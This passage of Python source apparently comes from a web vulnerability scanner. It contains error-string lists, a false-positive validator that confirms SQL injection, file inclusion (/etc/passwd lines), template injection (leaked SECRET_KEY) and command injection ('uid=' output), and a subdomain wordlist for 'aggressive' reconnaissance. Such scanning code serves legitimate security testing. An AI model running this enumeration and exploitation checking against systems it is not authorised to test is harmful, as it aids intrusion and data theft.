            'handshake timeout',
            'ssl negotiation failed',
            'tls negotiation failed',
            'unknown ca',
            'certificate revoked',
            'certificate not trusted',
            'certificate chain incomplete',
            'no shared cipher',
            'no suitable key exchange',
            'protocol version mismatch',
            'unsupported protocol',
            'ssl session not found',
            'ssl shutdown completed',
            'peer disconnected',
        ],
        
        # ==================== 601-650: CLOUD SERVICE ERRORS ====================
        'cloud_errors': [
            'aws service error',
            'ec2 error',
            's3 error',
            'access denied by aws',
            'aws rate limit exceeded',
            'lambda error',
            'dynamodb error',
            'rds error',
            'cloudfront error',
            'route53 error',
            'azure error',
            'azure storage error',
            'azure ad error',
            'azure vm error',
            'azure function error',
            'gcp error',
            'google cloud error',
            'cloud storage error',
            'bigquery error',
            'gke error',
            'cloud run error',
            'cloud function error',
            'firebase error',
            'firebase auth error',
            'firestore error',
            'realtime database error',
            'cloudflare error',
            'cloudflare worker error',
            'cloudflare pages error',
            'heroku error',
            'heroku timeout',
            'heroku h12 error',
            'heroku h13 error',
            'heroku h14 error',
            'heroku h15 error',
            'heroku h16 error',
            'vercel error',
            'vercel lambda timeout',
            'netlify error',
            'netlify function error',
            'digitalocean error',
            'do spaces error',
            'do kubernetes error',
            'linode error',
            'vultr error',
            'ovh error',
            'scaleway error',
            'akamai error',
            'fastly error',
            'cloudfront error',
            's3 bucket not found',
        ],
        
        # ==================== 651-700: OS/SYSTEM ERRORS ====================
        'system_errors': [
            'permission denied',
            'operation not permitted',
            'no such file or directory',
            'no such file',
            'directory not empty',
            'file exists',
            'is a directory',
            'not a directory',
            'read-only filesystem',
            'input/output error',
            'io error',
            'disk full',
            'no space left',
            'out of memory',
            'memory allocation failed',
            'cannot allocate memory',
            'fork failed',
            'resource temporarily unavailable',
            'too many open files',
            'file descriptor limit exceeded',
            'process limit reached',
            'invalid argument',
            'bad address',
            'bad file descriptor',
            'interrupted system call',
            'function not implemented',
            'operation not supported',
            'protocol not supported',
            'address family not supported',
            'address already in use',
            'address not available',
            'network is down',
            'network is unreachable',
            'connection already in progress',
            'connection reset by peer',
            'connection abort',
            'no buffer space available',
            'transport endpoint is not connected',
            'transport endpoint already connected',
            'too many symbolic links',
            'file name too long',
            'name too long',
            'no locks available',
            'no message of desired type',
            'identifier removed',
            'owner died',
            'state not recoverable',
            'errno not set',
            'unknown system error',
            'system call failed',
        ],
        
        # ==================== 701-750: LANGUAGE-SPECIFIC ERRORS ====================
        'lang_errors': [
            'null pointer exception',
            'null reference',
            'object reference not set',
            'undefined variable',
            'undefined index',
            'undefined offset',
            'call to undefined function',
            'call to undefined method',
            'cannot call method on null',
            'trying to get property of non-object',
            'uninitialized string offset',
            'class not found',
            'trait not found',
            'interface not found',
            'enum not found',
            'namespace not found',
            'file not found for inclusion',
            'failed to open stream',
            'cannot redeclare function',
            'cannot redeclare class',
            'already defined',
            'cannot extend final class',
            'cannot override final method',
            'abstract method not implemented',
            'interface method not implemented',
            'return type mismatch',
            'argument type mismatch',
            'too few arguments',
            'too many arguments',
            'missing argument',
            'undefined constant',
            'constraint violation',
            'type error',
            'type mismatch',
            'value error',
            'key error',
            'attribute error',
            'name error',
            'indentation error',
            'tab error',
            'syntax error',
            'parse error',
            'compilation error',
            'runtime error',
            'exception caught',
            'throwable caught',
            'unhandled exception type',
            'unchecked exception',
            'checked exception not handled',
            'exception in thread',
        ],
        
        # ==================== 751-800: LOAD BALANCING/INFRASTRUCTURE ====================
        'infra_errors': [
            'upstream timeout',
            'upstream connect error',
            'upstream server error',
            'bad gateway',
            '502 bad gateway',
            'invalid gateway',
            'gateway error',
            'proxy error',
            'proxy server error',
            'backend connection failed',
            'backend unavailable',
            'origin server unreachable',
            'origin timeout',
            'service unavailable',
            '503 service unavailable',
            'over capacity',
            'server too busy',
            'load balancer error',
            'health check failed',
            'node unhealthy',
            'pod unhealthy',
            'container unhealthy',
            'instance unhealthy',
            'server in draining state',
            'server in maintenance state',
            'replica set degraded',
            'cluster degraded',
            'quorum lost',
            'leader election failed',
            'split brain detected',
            'consensus failure',
            'raft error',
            'etcd error',
            'zookeeper error',
            'consul error',
            'eureka error',
            'service discovery failed',
            'dns resolution failed',
            'cannot resolve hostname',
            'dns lookup error',
            'dns timeout',
            'no such host',
            'host not found',
            'unknown host',
            'could not resolve host',
            'name resolution failed',
            'address resolution failed',
            'reverse lookup failed',
            'ptr record not found',
            'dns server not responding',
        ],
        
        # ==================== 801-850: CDN/CACHE ERRORS ====================
        'cache_errors': [
            'cache miss',
            'cache write failed',
            'cache read failed',
            'cache corruption',
            'cache pool error',
            'redis error',
            'redis connection failed',
            'redis timeout',
            'redis out of memory',
            'redis command failed',
            'memcached error',
            'memcached connection failed',
            'memcached timeout',
            'memcached server error',
            'varnish error',
            'varnish backend fetch failed',
            'varnish guru meditation',
            'varnish cache error',
            'squid error',
            'squid cache error',
            'squid access denied',
            'nginx cache error',
            'nginx proxy cache error',
            'fastcgi cache error',
            'cdn error',
            'cloudflare cache error',
            'cloudflare 520 error',
            'cloudflare 521 error',
            'cloudflare 522 error',
            'cloudflare 523 error',
            'cloudflare 524 error',
            'cloudflare 525 error',
            'cloudflare 526 error',
            'akamai cache error',
            'fastly cache error',
            'cache key collision',
            'cache stampede detected',
            'cache warming failed',
            'cache invalidation failed',
            'cache purge failed',
            'cache tag error',
            'cache namespace error',
            'serialization failed',
            'deserialization failed',
            'cache compression failed',
            'cache decompression failed',
            'ttl out of range',
            'cache quota exceeded',
            'cache item too large',
            'cache not configured',
        ],
        
        # ==================== 851-900: AUTH/OAUTH ERRORS ====================
        'oauth_errors': [
            'invalid client',
            'invalid client id',
            'invalid client secret',
            'client authentication failed',
            'invalid grant',
            'invalid authorization code',
            'invalid refresh token',
            'invalid redirect uri',
            'invalid scope',
            'invalid token response',
            'unsupported grant type',
            'unsupported response type',
            'unauthorized client',
            'access denied by resource owner',
            'access denied by authorization server',
            'consent required',
            'interaction required',
            'login required',
            'account selection required',
            'consent not provided',
            'permission denied by user',
            'user not authorized for this application',
            'application not authorized',
            'insufficient scope',
            'insufficient permissions for scope',
            'invalid request object',
            'invalid id token',
            'invalid user info response',
            'invalid device code',
            'expired device code',
            'slow down',
            'authorization pending',
            'device polling required',
            'too many failed attempts',
            'invalid 2fa code',
            'invalid totp code',
            'invalid sms code',
            'invalid email code',
            '2fa required',
            'mfa required',
            'multi-factor authentication required',
            'verification required',
            'email verification required',
            'phone verification required',
            'backup code invalid',
            'recovery code invalid',
            'security key invalid',
            'webauthn error',
            'fido2 error',
            'passkey error',
        ],
        
        # ==================== 901-950: PAYMENT/BUSINESS ERRORS ====================
        'payment_errors': [
            'payment failed',
            'payment declined',
            'card declined',
            'insufficient funds',
            'card expired',
            'invalid card number',
            'invalid cvv',
            'invalid expiry date',
            'card not supported',
            'card type not accepted',
            'transaction declined by bank',
            'risk score too high',
            'fraud detection triggered',
            'suspicious transaction',
            'velocity limit exceeded',
            'daily limit exceeded',
            'weekly limit exceeded',
            'monthly limit exceeded',
            'per transaction limit exceeded',
            'merchant limit exceeded',
            'processor error',
            'gateway error',
            'payment gateway timeout',
            'invalid currency',
            'currency not supported',
            'amount below minimum',
            'amount above maximum',
            'negative amount not allowed',
            'zero amount not allowed',
            'partial payment not allowed',
            'recurring payment failed',
            'subscription expired',
            'subscription cancelled',
            'subscription payment failed',
            'invoice past due',
            'account past due',
            'payment method invalid',
            'payment method expired',
            'no default payment method',
            'verification required for payment',
            '3d secure required',
            '3d secure failed',
            'authentication failed for transaction',
            'cvv verification failed',
            'avs mismatch',
            'address verification failed',
            'zip code mismatch',
            'cardholder name mismatch',
            'country mismatch',
            'bin not supported',
            'issuer not supported',
            'network token not available',
        ],
        
        # ==================== 951-1000: WEB SECURITY/VULNERABILITY ERRORS ====================
        'security_errors': [
            'xss detected',
            'reflected xss attempt blocked',
            'stored xss attempt blocked',
            'dom xss detected',
            'sql injection attempt blocked',
            'blind sql injection detected',
            'boolean based sql injection',
            'time based sql injection',
            'union based sql injection',
            'command injection attempt',
            'rce attempt detected',
            'code injection detected',
            'ldap injection attempt',
            'nosql injection detected',
            'xxe attack detected',
            'xml external entity injection',
            'xpath injection detected',
            'path traversal attempt',
            'directory traversal detected',
            'file inclusion attempt',
            'local file inclusion blocked',
            'remote file inclusion blocked',
            'ssrf attempt detected',
            'open redirect blocked',
            'http header injection',
            'response splitting detected',
            'cookie injection detected',
            'csrf token missing',
            'csrf token invalid',
            'csrf protection triggered',
            'clickjacking attempt blocked',
            'frame denial response',
            'x-frame-options violation',
            'csp violation detected',
            'content security policy violation',
            'hpkp violation',
            'hsts violation detected',
            'mixed content blocked',
            'insecure form submission blocked',
            'http method not allowed',
            'unsafe method detected',
            'method override attempt',
            'content spoofing detected',
            'mime type mismatch',
            'sniffing protection triggered',
            'dangling markup injection',
            'template injection detected',
            'server side template injection',
            'client side template injection',
            'angularjs sandbox escape attempt',
        ],
    }

    # ─── Stage 4: Vuln-specific Validation ─────────────────────────────────
    SQLI_CONFIRMED = [
        r'SQL\s*syntax.*near',
        r'unclosed quotation mark after',
        r'you have an error in your sql syntax',
        r'sqlstate\[\w+\]',
        r'ORA-\d{5}',
        r'mysql_fetch_(?:array|assoc|row|object)',
        r'mysqli_fetch_(?:array|assoc|row|object)',
        r'pg_query\s*\(\)',
        r'sqlite_query\s*\(',
        r'odbc_exec\s*\(\)',
        r'mssql_query\s*\(',
        r'unknown column',
        r"table.*doesn't exist",
        r'division by zero',
        r'conversion failed',
        r'syntax error in string',
        r'PostgreSQL.*ERROR',
        r'SQLite.*error',
        r'Microsoft OLE DB',
        r'ODBC Driver',
        r'invalid query',
        r'database error',
    ]
    
    SQLI_FALSE = [
        r'undefined index',
        r'undefined variable',
        r'undefined function',
        r'array to string conversion',
        r'headers already sent',
        r'cannot modify header',
        r'permission denied',
        r'connection refused',
        r'connection timed out',
        r'file not found',
        r'no such file or directory',
        r'class not found',
        r'call to undefined',
        r'out of memory',
        r'maximum execution time',
        r'call stack',
        r'stack trace',
        r'traceback',
        r'error on line',
        r'in /var/www/',
        r'in /home/',
        r'vendor/',
        r'node_modules/',
        r'wp-includes/',
        r'laravel/framework',
        r'symfony/',
        r'django/',
        r'flask/',
        r'express/',
        r'exception',
    ]
    
    LFI_CONFIRMED = [
        r'root:x:0:0:root:/root:',
        r'daemon:x:1:1:daemon:',
        r'bin:x:2:2:bin:',
        r'sys:x:3:3:sys:',
        r'nobody:x:\d+:\d+:nobody:',
        r'mail:x:\d+:',
        r'www-data:x:',
        r'mysql:x:',
        r'postgres:x:',
    ]
    
    def __init__(self, config: Config):
        self.config = config
        self.filtered = 0
        self.filter_log = []
        self.baseline_cache = OrderedDict()
        self.domain_errors = defaultdict(Counter)
    
    def pre_filter(self, param: str, response: Dict) -> Tuple[bool, str]:
        """Stage 0: Quick elimination of obviously safe cases."""
        param_lower = param.lower()
        
        # Check immune parameters
        if param_lower in self.IMMUNE_PARAMETERS:
            return False, f"Immune param: {param}"
        
        if any(immune in param_lower for immune in ['csrf', 'nonce', 'token']):
            return False, f"Token-like param: {param}"
        
        # Check static content
        content_type = response.get('headers', {}).get('Content-Type', '')
        if any(ct in content_type for ct in self.STATIC_CONTENT):
            return False, f"Static content: {content_type}"
        
        return True, "Stage 0 passed"
    
    def detect_error_page(self, response: Dict) -> Tuple[bool, str]:
        """Stage 1: Detect error/WAF/captcha pages."""
        text = (response.get('text', '') or '').lower()
        status = response.get('status', 0)
        
        for category, patterns in self.ERROR_PATTERNS.items():
            if status in [403, 404, 429, 500, 502, 503] or category in ['maintenance', 'captcha', 'login']:
                for pattern in patterns:
                    if pattern in text:
                        return True, f"Error: {category}"
            
            # Multi-pattern matching (2+ patterns = high confidence)
            matches = sum(1 for p in patterns if p in text)
            if matches >= 2:
                return True, f"Multiple {category} patterns ({matches})"
        
        # Small error responses
        if response.get('size', 0) < 300 and status >= 400:
            return True, f"Small error: HTTP {status}"
        
        return False, ""
    
    def structural_similarity(self, text1: str, text2: str) -> float:
        """Stage 2: Compare DOM structures."""
        if not text1 or not text2:
            return 0.0
        
        try:
            soup1 = BeautifulSoup(text1, 'lxml')
            soup2 = BeautifulSoup(text2, 'lxml')
            
            tags1 = [t.name for t in soup1.find_all(limit=150)]
            tags2 = [t.name for t in soup2.find_all(limit=150)]
            
            if tags1 and tags2:
                return SequenceMatcher(None, ' '.join(tags1), ' '.join(tags2)).ratio()
        except Exception:
            pass
        
        # Fallback: tag frequency cosine similarity
        tags1 = Counter(re.findall(r'<(\w+)', text1.lower()))
        tags2 = Counter(re.findall(r'<(\w+)', text2.lower()))
        
        all_tags = set(tags1.keys()) | set(tags2.keys())
        if not all_tags:
            return 0.0
        
        dot = sum(tags1.get(t, 0) * tags2.get(t, 0) for t in all_tags)
        mag1 = math.sqrt(sum(v**2 for v in tags1.values()))
        mag2 = math.sqrt(sum(v**2 for v in tags2.values()))
        
        if mag1 == 0 or mag2 == 0:
            return 0.0
        
        return dot / (mag1 * mag2)
    
    def check_reflection(self, response: Dict, payload: str) -> Tuple[bool, str]:
        """Stage 3: Analyze where/how payload appears."""
        text = response.get('text', '')
        
        if not payload or payload not in text:
            return False, "Not reflected"
        
        pos = text.find(payload)
        ctx_start = max(0, pos - 200)
        ctx_end = min(len(text), pos + len(payload) + 200)
        context = text[ctx_start:ctx_end]
        
        # Safe contexts
        if html.escape(payload) in context and payload != html.escape(payload):
            return True, "HTML encoded (safe)"
        
        if quote(payload) in context and payload != quote(payload):
            return True, "URL encoded (safe)"
        
        if '<!--' in context[:pos-ctx_start] and '-->' in context[pos-ctx_start+len(payload):]:
            return True, "HTML comment (safe)"
        
        if '<meta' in context[:200]:
            return True, "Meta tag (safe)"
        
        if context.count('"') > 8 and '"error"' in context.lower():
            return True, "JSON error (safe)"
        
        return False, "Dangerous context"
    
    def validate_vuln(self, finding: Dict, test_response: Dict) -> Tuple[bool, str]:
        """Stage 4: Vulnerability-specific deep validation."""
        vuln_type = finding.get('vuln_type', '')
        payload = finding.get('payload', '')
        text = (test_response.get('text', '') or '')
        text_lower = text.lower()
        
        if vuln_type in ['XSS', 'Reflected XSS']:
            # Must not be sanitized
            if '&lt;script' in text and '<script' not in text:
                return False, "XSS sanitized"
            csp = test_response.get('headers', {}).get('Content-Security-Policy', '')
            if csp and "script-src 'self'" in csp and "unsafe-inline" not in csp:
                return False, "CSP blocks XSS"
            return True, "XSS executable"
        
        elif vuln_type in ['SQLi', 'SQL Injection', 'Blind SQL Injection']:
            confirmed = [p for p in self.SQLI_CONFIRMED if re.search(p, text_lower)]
            false_pos = [p for p in self.SQLI_FALSE if re.search(p, text_lower)]
            
            if confirmed and not false_pos:
                return True, f"SQL error confirmed: {confirmed[0][:50]}"
            if confirmed and false_pos and len(confirmed) >= len(false_pos):
                return True, f"SQL errors ({len(confirmed)}) >= false ({len(false_pos)})"
            if false_pos and not confirmed:
                return False, f"False pattern: {false_pos[0][:50]}"
            if test_response.get('response_time', 0) > 5:
                return True, f"Time-based ({test_response['response_time']:.1f}s)"
            return False, "No SQLi confirmed"
        
        elif vuln_type == 'LFI':
            matches = [p for p in self.LFI_CONFIRMED if re.search(p, text)]
            if matches:
                entries = len(re.findall(r'^[a-z_][a-z0-9_-]*:x:\d+:\d+:', text, re.MULTILINE))
                return True, f"Passwd file ({entries} users)"
            return False, "No passwd content"
        
        elif vuln_type == 'SSTI':
            if '49' in text and payload not in text and '7*7' not in text:
                return True, "SSTI evaluated"
            config_indicators = ['SECRET_KEY', 'DATABASE_URL', 'DEBUG']
            if sum(1 for i in config_indicators if i in text) >= 2:
                return True, "SSTI config leak"
            return False, "No SSTI evaluation"
        
        elif vuln_type in ['Command Injection', 'CMDi']:
            if 'uid=' in text or 'gid=' in text or 'root' in text.split('\n')[0] if '\n' in text else False:
                return True, "Command output detected"
            return False, "No command output"
        
        return True, "Auto-passed"
    
    def validate(self, finding: Dict, baseline: Dict = None, test_response: Dict = None) -> Tuple[bool, str]:
        """Full 5-stage validation pipeline."""
        url = finding.get('url', '')
        param = finding.get('param', '')
        vuln_type = finding.get('vuln_type', '')
        
        domain = urlparse(url).netloc if url else ''
        
        # Stage 0
        if test_response:
            ok, reason = self.pre_filter(param, test_response)
            if not ok:
                return self._reject(url, vuln_type, f"S0:{reason}")
        
        # Stage 1
        if test_response:
            is_err, reason = self.detect_error_page(test_response)
            if is_err:
                self.domain_errors[domain][reason] += 1
                return self._reject(url, vuln_type, f"S1:{reason}")
        
        # Stage 2
        if baseline and test_response:
            sim = self.structural_similarity(
                baseline.get('text', ''),
                test_response.get('text', '')
            )
            if sim > self.config.fp_similarity_threshold:
                return self._reject(url, vuln_type, f"S2:Similar {sim:.3f}")
        
        # Stage 3 (XSS specific)
        if test_response and vuln_type in ['XSS', 'Reflected XSS']:
            is_safe, reason = self.check_reflection(test_response, finding.get('payload', ''))
            if is_safe:
                return self._reject(url, vuln_type, f"S3:{reason}")
        
        # Stage 4
        if test_response:
            ok, reason = self.validate_vuln(finding, test_response)
            if not ok:
                return self._reject(url, vuln_type, f"S4:{reason}")
        
        # Stage 5: Behavioral (passed if we got here)
        finding['validation_status'] = 'verified'
        finding['validation_chain'] = 'S0→S1→S2→S3→S4→S5 ✓'
        finding['confidence'] = min(100, finding.get('confidence', 80) + 15)
        
        return True, "VERIFIED ✓"
    
    def _reject(self, url: str, vuln_type: str, reason: str) -> Tuple[bool, str]:
        """Reject finding as false positive."""
        self.filtered += 1
        self.filter_log.append({
            'url': url, 'type': vuln_type, 'reason': reason,
            'timestamp': datetime.now().isoformat()
        })
        if len(self.filter_log) > 3000:
            self.filter_log = self.filter_log[-1500:]
        return False, reason
    
    def get_stats(self) -> Dict:
        """Get FP statistics."""
        reasons = Counter(e['reason'].split(':')[0] for e in self.filter_log)
        types = Counter(e['type'] for e in self.filter_log)
        return {
            'total_filtered': self.filtered,
            'by_stage': dict(reasons.most_common(10)),
            'by_type': dict(types.most_common(10)),
        }

# ═══════════════════════════════════════════════════════════════════════════════════════
# RECONNAISSANCE ENGINE — AGGRESSIVE DISCOVERY
# ═══════════════════════════════════════════════════════════════════════════════════════

class ReconEngine:
    """Multi-source reconnaissance engine."""
    
    # Subdomain wordlist (top 500)
    SUBDOMAIN_WORDLIST = [
        # ==================== 1-100: CORE/BASIC SERVICES ====================
        "www", "mail", "webmail", "smtp", "ftp", "api", "api-dev", "api-staging",
        "api-v1", "api-v2", "api-v3", "rest", "rest-api", "graphql", "graph",
        "admin", "administrator", "adm", "cp", "panel", "dashboard", "cpanel",
        "dev", "development", "develop", "stage", "staging", "test", "testing",
        "qa", "sandbox", "demo", "beta", "alpha", "preview", "prototype",
        "docs", "documentation", "wiki", "confluence", "help", "support",
        "blog", "blogs", "news", "shop", "store", "market", "cart", "checkout",
        "cdn", "static", "assets", "media", "images", "img", "files", "download",
        "monitor", "monitoring", "status", "health", "logs", "log", "metrics",
        "jenkins", "gitlab", "github", "bitbucket", "git", "code", "repo",
        "grafana", "kibana", "kibana-logging", "prometheus", "alertmanager",
        "vault", "secure", "security", "auth", "sso", "login", "oauth", "saml",
        "vpn", "proxy", "gateway", "bastion", "jump", "ssh", "remote",
        "db", "database", "mysql", "postgres", "postgresql", "mongo", "mongodb",
        "redis", "cache", "memcache", "memcached", "elastic", "elasticsearch",
        "backup", "backups", "bak", "old", "archive", "archives",
        "internal", "intranet", "corp", "corporate", "office", "portal",
        "mobile", "m", "app", "apps", "application", "applications",
        "cloud", "host", "hosting", "server", "servers", "node", "cluster",
        "ns1", "ns2", "ns3", "dns", "dns1", "dns2", "nameserver",
        "mx", "mx1", "mx2", "mailserver", "imap", "pop", "pop3",
        "web", "web1", "web2", "app1", "app2", "srv1", "srv2",
        "uat", "preprod", "pre-prod", "production", "prod", "live",
        "crm", "erp", "sap", "oracle", "jira", "servicenow", "zendesk",
        "wordpress", "wp", "wp-admin", "joomla", "drupal", "magento",
        "sharepoint", "exchange", "lync", "skype", "teams",
        "calendar", "cal", "meet", "meeting", "conference", "conf",
        "chat", "messenger", "im", "slack", "discord", "mattermost",
        "ldap", "ad", "active-directory", "dc", "domaincontroller",
        "print", "printer", "scanner", "scan", "fax",
        "camera", "cam", "nvr", "dvr", "cctv", "video",
        "iot", "device", "sensor", "controller", "plc",
        "wifi", "wireless", "guest", "public", "open",
        "partner", "partners", "vendor", "vendors", "supplier",
        "career", "careers", "job", "jobs", "hr", "human-resources",
        "investor", "investors", "ir", "press", "media", "newsroom",
        "sso-dev", "sso-staging", "auth-dev", "login-dev", "portal-dev",
        "api-internal", "api-external", "api-public", "api-private",
        "k8s", "kubernetes", "docker", "container", "registry",
        "traefik", "nginx", "apache", "haproxy", "loadbalancer", "lb",
        "firewall", "fw", "ids", "ips", "waf", "antivirus",
        "pay", "payment", "billing", "invoice", "accounting", "finance",
        "cdn-staging", "cdn-dev", "static-dev", "assets-dev", "media-dev",
        "webmail-dev", "mail-dev", "smtp-dev", "imap-dev",
        "webdisk", "webdav", "cpanel-dev", "whm", "whmcs",
        "phpmyadmin", "phpmyadmin-dev", "pma", "adminer",
        
        # ==================== 101-200: NUMBERED INSTANCES ====================
        "web01", "web02", "web03", "web04", "web05", "web06", "web07", "web08", "web09", "web10",
        "web11", "web12", "web13", "web14", "web15", "web16", "web17", "web18", "web19", "web20",
        "app01", "app02", "app03", "app04", "app05", "app06", "app07", "app08", "app09", "app10",
        "app11", "app12", "app13", "app14", "app15", "app16", "app17", "app18", "app19", "app20",
        "db01", "db02", "db03", "db04", "db05", "db06", "db07", "db08", "db09", "db10",
        "db11", "db12", "db13", "db14", "db15", "db16", "db17", "db18", "db19", "db20",
        "api01", "api02", "api03", "api04", "api05", "api06", "api07", "api08", "api09", "api10",
        "api11", "api12", "api13", "api14", "api15", "api16", "api17", "api18", "api19", "api20",
        "srv01", "srv02", "srv03", "srv04", "srv05", "srv06", "srv07", "srv08", "srv09", "srv10",
        "srv11", "srv12", "srv13", "srv14", "srv15", "srv16", "srv17", "srv18", "srv19", "srv20",
        "node01", "node02", "node03", "node04", "node05", "node06", "node07", "node08", "node09", "node10",
        "node11", "node12", "node13", "node14", "node15", "node16", "node17", "node18", "node19", "node20",
        "cache01", "cache02", "cache03", "cache04", "cache05", "cache06", "cache07", "cache08", "cache09", "cache10",
        "redis01", "redis02", "redis03", "redis04", "redis05", "redis06", "redis07", "redis08", "redis09", "redis10",
        "memcache01", "memcache02", "memcache03", "memcache04", "memcache05", "memcache06", "memcache07", "memcache08", "memcache09", "memcache10",
        "elastic01", "elastic02", "elastic03", "elastic04", "elastic05", "elastic06", "elastic07", "elastic08", "elastic09", "elastic10",
        "lb01", "lb02", "lb03", "lb04", "lb05", "lb06", "lb07", "lb08", "lb09", "lb10",
        "proxy01", "proxy02", "proxy03", "proxy04", "proxy05", "proxy06", "proxy07", "proxy08", "proxy09", "proxy10",
        "gateway01", "gateway02", "gateway03", "gateway04", "gateway05", "gateway06", "gateway07", "gateway08", "gateway09", "gateway10",
        "monitor01", "monitor02", "monitor03", "monitor04", "monitor05", "monitor06", "monitor07", "monitor08", "monitor09", "monitor10",
        
        # ==================== 201-300: CLOUD PROVIDER SPECIFIC ====================
        "aws", "aws-dev", "aws-staging", "aws-prod", "aws-test", "aws-demo",
        "aws-lb", "aws-elb", "aws-alb", "aws-nlb", "aws-s3", "aws-s3-bucket",
        "aws-rds", "aws-dynamodb", "aws-lambda", "aws-lambda-dev", "aws-lambda-prod",
        "aws-ec2", "aws-ecs", "aws-eks", "aws-ecr", "aws-fargate",
        "aws-cloudfront", "aws-route53", "aws-api-gateway", "aws-cognito", "aws-ses",
        "aws-sqs", "aws-sns", "aws-kinesis", "aws-redshift", "aws-emr",
        "azure", "azure-dev", "azure-staging", "azure-prod", "azure-test",
        "azure-vm", "azure-appservice", "azure-functions", "azure-storage", "azure-blob",
        "azure-sql", "azure-cosmosdb", "azure-redis", "azure-servicebus", "azure-eventhub",
        "azure-aks", "azure-acr", "azure-aci", "azure-vnet", "azure-vpn",
        "gcp", "gcp-dev", "gcp-staging", "gcp-prod", "gcp-test",
        "gcp-compute", "gcp-gke", "gcp-cloudrun", "gcp-cloudfunctions", "gcp-appengine",
        "gcp-storage", "gcp-bigquery", "gcp-datastore", "gcp-firestore", "gcp-redis",
        "gcp-sql", "gcp-spanner", "gcp-bigtable", "gcp-pubsub", "gcp-composer",
        "do", "digitalocean", "do-dev", "do-staging", "do-prod",
        "do-droplet", "do-kubernetes", "do-appplatform", "do-spaces", "do-database",
        "do-loadbalancer", "do-firewall", "do-volume", "do-cdn", "do-functions",
        "linode", "linode-dev", "linode-staging", "linode-prod", "linode-test",
        "vultr", "vultr-dev", "vultr-staging", "vultr-prod", "vultr-test",
        "heroku", "heroku-dev", "heroku-staging", "heroku-prod", "heroku-test",
        "heroku-app", "heroku-dyno", "heroku-postgres", "heroku-redis", "heroku-kafka",
        "netlify", "netlify-dev", "netlify-staging", "netlify-prod", "netlify-test",
        "vercel", "vercel-dev", "vercel-staging", "vercel-prod", "vercel-test",
        "cloudflare", "cloudflare-dev", "cloudflare-staging", "cloudflare-prod", "cloudflare-workers",
        "fastly", "fastly-dev", "fastly-staging", "fastly-prod", "fastly-test",
        "akamai", "akamai-dev", "akamai-staging", "akamai-prod", "akamai-test",
        
        # ==================== 301-400: POPULAR APPLICATIONS ====================
        "wordpress", "wp-admin", "wp-login", "wp-content", "wp-includes", "wp-json",
        "wp-api", "wp-cron", "wp-signup", "wp-activate", "wp-mail", "wp-comments",
        "woocommerce", "wp-shop", "wp-cart", "wp-checkout", "wp-my-account",
        "elementor", "wp-elementor", "elementor-dev", "beaver-builder", "wp-beaver",
        "yoast", "wp-yoast", "yoast-dev", "rankmath", "wp-rankmath", "all-in-one-seo",
        "drupal", "drupal-admin", "drupal-user", "drupal-node", "drupal-comment",
        "drupal-api", "drupal-dev", "drupal-test", "drupal-staging", "drupal-prod",
        "joomla", "joomla-admin", "joomla-api", "joomla-dev", "joomla-test",
        "magento", "magento-admin", "magento-api", "magento-dev", "magento-test",
        "magento-store", "magento-shop", "magento-checkout", "magento-cart", "magento-customer",
        "prestashop", "prestashop-admin", "prestashop-api", "prestashop-dev", "prestashop-test",
        "opencart", "opencart-admin", "opencart-api", "opencart-dev", "opencart-test",
        "shopify", "shopify-store", "shopify-api", "shopify-dev", "shopify-test",
        "bigcommerce", "bigcommerce-store", "bigcommerce-api", "bigcommerce-dev", "bigcommerce-test",
        "laravel", "laravel-app", "laravel-api", "laravel-dev", "laravel-test",
        "laravel-staging", "laravel-prod", "laravel-horizon", "laravel-telescope", "laravel-nova",
        "symfony", "symfony-app", "symfony-api", "symfony-dev", "symfony-test",
        "django", "django-app", "django-api", "django-dev", "django-test",
        "rails", "rails-app", "rails-api", "rails-dev", "rails-test",
        "flask", "flask-app", "flask-api", "flask-dev", "flask-test",
        "express", "express-app", "express-api", "express-dev", "express-test",
        "spring", "spring-app", "spring-api", "spring-dev", "spring-test",
        "spring-boot", "spring-cloud", "spring-batch", "spring-data", "spring-security",
        "react", "react-app", "react-dev", "react-test", "react-staging",
        "vue", "vue-app", "vue-dev", "vue-test", "vue-staging",
        "angular", "angular-app", "angular-dev", "angular-test", "angular-staging",
        "nextjs", "nextjs-app", "nextjs-dev", "nextjs-test", "nextjs-staging",
        "nuxtjs", "nuxtjs-app", "nuxtjs-dev", "nuxtjs-test", "nuxtjs-staging",
        "gatsby", "gatsby-app", "gatsby-dev", "gatsby-test", "gatsby-staging",
        
        # ==================== 401-500: MONITORING & OBSERVABILITY ====================
        "grafana", "grafana-dev", "grafana-staging", "grafana-prod", "grafana-test",
        "grafana-logs", "grafana-metrics", "grafana-alerts", "grafana-dashboards", "grafana-internal",
        "prometheus", "prometheus-dev", "prometheus-staging", "prometheus-prod", "prometheus-test",
        "prometheus-alerts", "prometheus-rules", "prometheus-metrics", "prometheus-tsdb", "prometheus-operator",
        "alertmanager", "alertmanager-dev", "alertmanager-staging", "alertmanager-prod", "alertmanager-test",
        "kibana", "kibana-dev", "kibana-staging", "kibana-prod", "kibana-test",
        "kibana-logs", "kibana-dashboards", "kibana-discover", "kibana-visualize", "kibana-analytics",
        "elasticsearch", "elasticsearch-dev", "elasticsearch-staging", "elasticsearch-prod", "elasticsearch-test",
        "elasticsearch-data", "elasticsearch-master", "elasticsearch-client", "elasticsearch-ingest", "elasticsearch-coordinating",
        "logstash", "logstash-dev", "logstash-staging", "logstash-prod", "logstash-test",
        "filebeat", "filebeat-dev", "filebeat-staging", "filebeat-prod", "filebeat-test",
        "metricbeat", "metricbeat-dev", "metricbeat-staging", "metricbeat-prod", "metricbeat-test",
        "heartbeat", "heartbeat-dev", "heartbeat-staging", "heartbeat-prod", "heartbeat-test",
        "auditbeat", "auditbeat-dev", "auditbeat-staging", "auditbeat-prod", "auditbeat-test",
        "packetbeat", "packetbeat-dev", "packetbeat-staging", "packetbeat-prod", "packetbeat-test",
        "datadog", "datadog-dev", "datadog-staging", "datadog-prod", "datadog-test",
        "datadog-agent", "datadog-metrics", "datadog-logs", "datadog-traces", "datadog-synthetics",
        "newrelic", "newrelic-dev", "newrelic-staging", "newrelic-prod", "newrelic-test",
        "newrelic-agent", "newrelic-metrics", "newrelic-apm", "newrelic-browser", "newrelic-synthetics",
        "splunk", "splunk-dev", "splunk-staging", "splunk-prod", "splunk-test",
        "splunk-forwarder", "splunk-indexer", "splunk-search", "splunk-dashboard", "splunk-alerts",
        "sumologic", "sumologic-dev", "sumologic-staging", "sumologic-prod", "sumologic-test",
        "loggly", "loggly-dev", "loggly-staging", "loggly-prod", "loggly-test",
        "papertrail", "papertrail-dev", "papertrail-staging", "papertrail-prod", "papertrail-test",
        "loki", "loki-dev", "loki-staging", "loki-prod", "loki-test",
